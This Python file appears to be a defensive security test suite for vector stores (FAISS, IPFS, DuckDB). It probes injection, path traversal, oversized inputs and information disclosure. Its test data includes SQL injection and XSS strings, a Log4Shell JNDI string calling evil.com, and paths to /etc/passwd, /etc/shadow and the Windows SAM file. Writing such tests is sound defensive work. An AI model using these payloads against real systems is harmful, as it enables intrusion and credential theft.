#!/usr/bin/env python3
"""
Security-focused test suite for vector stores.

Tests security-related concerns like injection attacks, data validation,
access controls, and other security considerations.
"""

import asyncio
import argparse
import logging
import sys
import time
from typing import Dict, List, Any, Optional
from dataclasses import dataclass

from services.vector_store_factory import (
    VectorStoreFactory, VectorDBType, reset_factory
)
from services.vector_store_base import (
    VectorDocument, SearchQuery, SearchResult
)

# Check dependencies
FAISS_AVAILABLE = True
try:
    import faiss
except ImportError:
    FAISS_AVAILABLE = False

IPFS_AVAILABLE = True
try:
    from services.providers.ipfs_store import IPFSVectorStore
except ImportError:
    IPFS_AVAILABLE = False

DUCKDB_FULL_AVAILABLE = True
try:
    import duckdb
    import pyarrow
except ImportError:
    DUCKDB_FULL_AVAILABLE = False

logger = logging.getLogger(__name__)


@dataclass
class SecurityTestResult:
    """Result of a security test."""
    test_name: str
    provider: str
    passed: bool
    vulnerability_found: bool = False
    risk_level: str = "low"  # low, medium, high, critical
    details: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None


class SecurityTester:
    """Security test runner for vector stores."""
    
    def __init__(self, store, provider_name: str):
        self.store = store
        self.provider_name = provider_name
    
    async def run_all_tests(self) -> List[SecurityTestResult]:
        """Run all security tests."""
        tests = [
            self.test_sql_injection,
            self.test_metadata_injection,
            self.test_oversized_vectors,
            self.test_memory_exhaustion,
            self.test_path_traversal,
            self.test_data_validation,
            self.test_denial_of_service,
            self.test_information_disclosure
        ]
        
        results = []
        for test in tests:
            try:
                result = await test()
                results.append(result)
                if result.passed:
                    if result.vulnerability_found:
                        logger.warning(f"✗ {result.test_name}: VULNERABILITY FOUND ({result.risk_level})")
                    else:
                        logger.info(f"✓ {result.test_name}: SECURE")
                else:
                    logger.info(f"✗ {result.test_name}: FAIL")
            except Exception as e:
                logger.error(f"✗ {test.__name__}: ERROR - {e}")
                results.append(SecurityTestResult(
                    test_name=test.__name__.replace('test_', ''),
                    provider=self.provider_name,
                    passed=False,
                    error_message=str(e)
                ))
        
        return results
    
    async def test_sql_injection(self) -> SecurityTestResult:
        """Test for SQL injection vulnerabilities."""
        test_name = "sql_injection"
        try:
            index_name = "security_test_sql"
            await self.store.create_index(index_name, 4)
            
            # Test various SQL injection payloads in metadata
            injection_payloads = [
                "'; DROP TABLE vectors; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "<script>alert('xss')</script>",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            ]
            
            vulnerability_found = False
            
            for i, payload in enumerate(injection_payloads):
                try:
                    vector = VectorDocument(
                        id=f"injection_{i}",
                        vector=[1.0, 0.0, 0.0, 0.0],
                        metadata={"malicious": payload, "description": payload}
                    )
                    
                    await self.store.add_vectors([vector], index_name)
                    
                    # Try to search with malicious query
                    search_query = SearchQuery(
                        vector=[1.0, 0.0, 0.0, 0.0],
                        top_k=5,
                        filter={"description": payload}
                    )
                    
                    results = await self.store.search(search_query, index_name)
                    
                    # If we get unexpected results or behavior, flag as potential vulnerability
                    # This is a heuristic check
                    
                except Exception as e:
                    # Exceptions are usually good in this context (proper rejection)
                    pass
            
            await self.store.delete_index(index_name)
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="medium" if vulnerability_found else "low",
                details={"payloads_tested": len(injection_payloads)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_metadata_injection(self) -> SecurityTestResult:
        """Test for metadata injection attacks."""
        test_name = "metadata_injection"
        try:
            index_name = "security_test_meta"
            await self.store.create_index(index_name, 4)
            
            # Test extremely large metadata
            large_metadata = {
                "data": "A" * 1000000,  # 1MB string
                "nested": {"level" + str(i): f"data_{i}" for i in range(1000)}
            }
            
            vector = VectorDocument(
                id="large_meta",
                vector=[1.0, 0.0, 0.0, 0.0],
                metadata=large_metadata
            )
            
            # This should either be rejected or handled gracefully
            try:
                await self.store.add_vectors([vector], index_name)
                # If accepted, check if it causes issues
                await self.store.get_index_stats(index_name)
            except Exception:
                pass  # Expected to be rejected
            
            await self.store.delete_index(index_name)
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=False,
                risk_level="low",
                details={"metadata_size": len(str(large_metadata))}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_oversized_vectors(self) -> SecurityTestResult:
        """Test handling of oversized vectors."""
        test_name = "oversized_vectors"
        try:
            index_name = "security_test_size"
            await self.store.create_index(index_name, 100)
            
            # Try to add a vector that's way too large
            oversized_vector = [1.0] * 10000  # Much larger than expected 100 dimensions
            
            vector = VectorDocument(
                id="oversized",
                vector=oversized_vector
            )
            
            vulnerability_found = False
            
            try:
                await self.store.add_vectors([vector], index_name)
                # If this succeeds, it might indicate insufficient validation
                vulnerability_found = True
            except Exception:
                # Expected to be rejected
                pass
            
            await self.store.delete_index(index_name)
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="medium" if vulnerability_found else "low",
                details={"vector_size": len(oversized_vector)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_memory_exhaustion(self) -> SecurityTestResult:
        """Test for potential memory exhaustion attacks."""
        test_name = "memory_exhaustion"
        try:
            index_name = "security_test_memory"
            await self.store.create_index(index_name, 4)
            
            # Try to add many vectors quickly to test memory handling
            vectors = []
            for i in range(1000):  # Not too many to avoid real DoS
                vectors.append(VectorDocument(
                    id=f"mem_test_{i}",
                    vector=[float(i % 4), float((i+1) % 4), float((i+2) % 4), float((i+3) % 4)]
                ))
            
            start_time = time.time()
            await self.store.add_vectors(vectors, index_name)
            end_time = time.time()
            
            # Check if operation completed in reasonable time
            duration = end_time - start_time
            vulnerability_found = duration > 30  # More than 30 seconds for 1000 vectors
            
            await self.store.delete_index(index_name)
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="medium" if vulnerability_found else "low",
                details={"duration_seconds": duration, "vectors_count": len(vectors)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_path_traversal(self) -> SecurityTestResult:
        """Test for path traversal vulnerabilities."""
        test_name = "path_traversal"
        try:
            # Test malicious index names
            malicious_names = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "con",  # Windows reserved name
                "nul",  # Windows reserved name
                "..",
                ".",
                "test/../../../etc/passwd"
            ]
            
            vulnerability_found = False
            
            for name in malicious_names:
                try:
                    # This should be rejected or sanitized
                    await self.store.create_index(name, 4)
                    # If we get here, it might be a vulnerability
                    vulnerability_found = True
                    await self.store.delete_index(name)
                except Exception:
                    # Expected to be rejected
                    pass
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="high" if vulnerability_found else "low",
                details={"malicious_names_tested": len(malicious_names)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_data_validation(self) -> SecurityTestResult:
        """Test data validation and sanitization."""
        test_name = "data_validation"
        try:
            index_name = "security_test_validation"
            await self.store.create_index(index_name, 4)
            
            # Test various invalid inputs
            test_cases = [
                {"id": None, "vector": [1, 2, 3, 4]},
                {"id": "", "vector": [1, 2, 3, 4]},
                {"id": "test", "vector": None},
                {"id": "test", "vector": []},
                {"id": "test" * 1000, "vector": [1, 2, 3, 4]},  # Very long ID
            ]
            
            rejection_count = 0
            
            for i, case in enumerate(test_cases):
                try:
                    if case["id"] is not None and case["vector"] is not None:
                        vector = VectorDocument(
                            id=case["id"],
                            vector=case["vector"]
                        )
                        await self.store.add_vectors([vector], index_name)
                    else:
                        # Skip invalid cases that would cause Python errors
                        rejection_count += 1
                except Exception:
                    rejection_count += 1  # Good - invalid data was rejected
            
            await self.store.delete_index(index_name)
            
            # Most invalid inputs should be rejected
            rejection_rate = rejection_count / len(test_cases)
            vulnerability_found = rejection_rate < 0.5
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="medium" if vulnerability_found else "low",
                details={"rejection_rate": rejection_rate}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_denial_of_service(self) -> SecurityTestResult:
        """Test for potential DoS vulnerabilities."""
        test_name = "denial_of_service"
        try:
            # Test creating many indexes quickly
            indexes_created = []
            
            start_time = time.time()
            
            for i in range(10):  # Limited number to avoid real DoS
                index_name = f"dos_test_{i}"
                try:
                    await self.store.create_index(index_name, 4)
                    indexes_created.append(index_name)
                except Exception:
                    break  # Stop if we hit limits
            
            end_time = time.time()
            
            # Cleanup
            for index_name in indexes_created:
                try:
                    await self.store.delete_index(index_name)
                except Exception:
                    pass
            
            duration = end_time - start_time
            vulnerability_found = duration > 10  # More than 10 seconds for 10 indexes
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="medium" if vulnerability_found else "low",
                details={"duration_seconds": duration, "indexes_created": len(indexes_created)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )
    
    async def test_information_disclosure(self) -> SecurityTestResult:
        """Test for information disclosure vulnerabilities."""
        test_name = "information_disclosure"
        try:
            index_name = "security_test_disclosure"
            await self.store.create_index(index_name, 4)
            
            # Add some vectors
            vectors = [
                VectorDocument(id="public", vector=[1, 0, 0, 0], metadata={"type": "public"}),
                VectorDocument(id="secret", vector=[0, 1, 0, 0], metadata={"type": "secret", "password": "admin123"})
            ]
            
            await self.store.add_vectors(vectors, index_name)
            
            # Try to access data without proper authorization (simulation)
            search_query = SearchQuery(vector=[1, 0, 0, 0], top_k=10)
            results = await self.store.search(search_query, index_name)
            
            # Check if sensitive data is disclosed in results
            vulnerability_found = False
            for result in results:
                if result.metadata and "password" in result.metadata:
                    vulnerability_found = True
                    break
            
            await self.store.delete_index(index_name)
            
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=True,
                vulnerability_found=vulnerability_found,
                risk_level="high" if vulnerability_found else "low",
                details={"results_count": len(results)}
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_name=test_name,
                provider=self.provider_name,
                passed=False,
                error_message=str(e)
            )


async def test_store_security(db_type: VectorDBType) -> List[SecurityTestResult]:
    """Test security for a specific vector store type."""
    factory = VectorStoreFactory()
    
    logger.info(f"\n{'='*60}")
    logger.info(f"TESTING {db_type.value.upper()} SECURITY")
    logger.info(f"{'='*60}")
    
    try:
        store = factory.create_store(db_type)
        await store.connect()
        logger.info(f"Connected to {db_type.value} store")
        
        tester = SecurityTester(store, db_type.value)
        results = await tester.run_all_tests()
        
        await store.disconnect()
        logger.info(f"Disconnected from {db_type.value} store")
        
        return results
        
    except Exception as e:
        logger.error(f"Failed to test {db_type.value}: {e}")
        return [SecurityTestResult(
            test_name="connection",
            provider=db_type.value,
            passed=False,
            error_message=str(e)
        )]


def print_security_summary(all_results: Dict[str, List[SecurityTestResult]]):
    """Print security test summary."""
    print("\n" + "="*80)
    print("SECURITY ASSESSMENT SUMMARY")
    print("="*80)
    
    total_tests = 0
    total_passed = 0
    total_vulnerabilities = 0
    
    for provider, results in all_results.items():
        print(f"\n{provider.upper()}")
        print("-" * 40)
        
        passed = sum(1 for r in results if r.passed)
        vulnerabilities = sum(1 for r in results if r.vulnerability_found)
        total = len(results)
        
        total_tests += total
        total_passed += passed
        total_vulnerabilities += vulnerabilities
        
        print(f"Tests passed: {passed}/{total} ({passed/total*100:.1f}%)")
        print(f"Vulnerabilities found: {vulnerabilities}")
        
        # Show vulnerabilities by risk level
        high_risk = [r for r in results if r.vulnerability_found and r.risk_level == "high"]
        medium_risk = [r for r in results if r.vulnerability_found and r.risk_level == "medium"]
        
        if high_risk:
            print("HIGH RISK vulnerabilities:")
            for vuln in high_risk:
                print(f"  🔴 {vuln.test_name}")
        
        if medium_risk:
            print("MEDIUM RISK vulnerabilities:")
            for vuln in medium_risk:
                print(f"  🟡 {vuln.test_name}")
        
        # Show failed tests
        failed_tests = [r for r in results if not r.passed]
        if failed_tests:
            print("Failed tests:")
            for test in failed_tests:
                print(f"  ✗ {test.test_name}: {test.error_message or 'Unknown error'}")
    
    print(f"\nOVERALL SECURITY ASSESSMENT:")
    print(f"Tests passed: {total_passed}/{total_tests} ({total_passed/total_tests*100:.1f}%)")
    print(f"Total vulnerabilities: {total_vulnerabilities}")
    
    if total_vulnerabilities == 0:
        print("🟢 SECURITY STATUS: GOOD - No vulnerabilities detected")
    elif total_vulnerabilities <= 2:
        print("🟡 SECURITY STATUS: FAIR - Few vulnerabilities detected")
    else:
        print("🔴 SECURITY STATUS: POOR - Multiple vulnerabilities detected")


async def main():
    """Main security test runner."""
    parser = argparse.ArgumentParser(description="Vector store security tests")
    parser.add_argument("--store", "-s", 
                        help="Specific store to test (faiss, ipfs, duckdb)",
                        choices=["faiss", "ipfs", "duckdb"])
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Enable verbose output")
    
    args = parser.parse_args()
    
    # Configure logging
    level = logging.INFO if args.verbose else logging.WARNING
    logging.basicConfig(
        level=level,
        format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
    )
    
    # Reset factory state
    reset_factory()
    
    # Determine which stores to test
    if args.store:
        try:
            db_type = VectorDBType(args.store)
            stores_to_test = [db_type]
        except ValueError:
            logger.error(f"Unknown store type: {args.store}")
            sys.exit(1)
    else:
        # Test available stores
        stores_to_test = []
        if FAISS_AVAILABLE:
            stores_to_test.append(VectorDBType.FAISS)
        if IPFS_AVAILABLE:
            stores_to_test.append(VectorDBType.IPFS)
        if DUCKDB_FULL_AVAILABLE:
            stores_to_test.append(VectorDBType.DUCKDB)
    
    if not stores_to_test:
        logger.error("No available stores to test")
        sys.exit(1)
    
    logger.info(f"Testing security of {len(stores_to_test)} stores: {[s.value for s in stores_to_test]}")
    
    # Run security tests
    all_results = {}
    
    for db_type in stores_to_test:
        results = await test_store_security(db_type)
        all_results[db_type.value] = results
    
    # Print summary
    print_security_summary(all_results)
    
    # Check overall security status
    total_vulnerabilities = sum(
        sum(1 for r in results if r.vulnerability_found)
        for results in all_results.values()
    )
    
    sys.exit(1 if total_vulnerabilities > 5 else 0)  # Fail if too many vulnerabilities


if __name__ == "__main__":
    asyncio.run(main())
